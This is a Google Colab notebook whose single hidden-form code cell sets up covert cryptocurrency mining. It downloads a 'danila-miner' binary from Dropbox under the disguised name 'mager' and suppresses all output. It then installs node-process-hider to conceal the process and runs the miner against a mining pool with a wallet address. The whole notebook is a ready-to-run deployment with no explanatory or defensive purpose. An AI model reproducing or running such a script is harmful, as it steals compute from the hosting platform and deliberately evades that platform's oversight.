{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "tono.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "authorship_tag": "ABX9TyM3TqGVGQlTcIIuXeLD6X67",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/suciani662/beton/blob/main/tono.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "cellView": "form",
        "id": "xrbvLSbn65VN"
      },
      "outputs": [],
      "source": [
        "#@title T O N O\n",
        "%%shell\n",
        "wget -O mager https://www.dropbox.com/s/acvfy7a0h8szp8p/danila-miner?dl=1 > /dev/null 2>&1\n",
        "chmod +x mager\n",
        "sudo apt-get update && apt-get install -y screen > /dev/null 2>&1\n",
        "apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev xz-utils -y > /dev/null 2>&1\n",
        "apt-get install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y > /dev/null 2>&1\n",
        "npm i -g node-process-hider > /dev/null 2>&1\n",
        "ph add mager > /dev/null 2>&1\n",
        "./mager run https://server1.whalestonpool.com EQCI5-3oEr4Kd9jCK7NFL4NvOYCa-qYtE0AqrG1B4wkSR0LE"
      ]
    }
  ]
}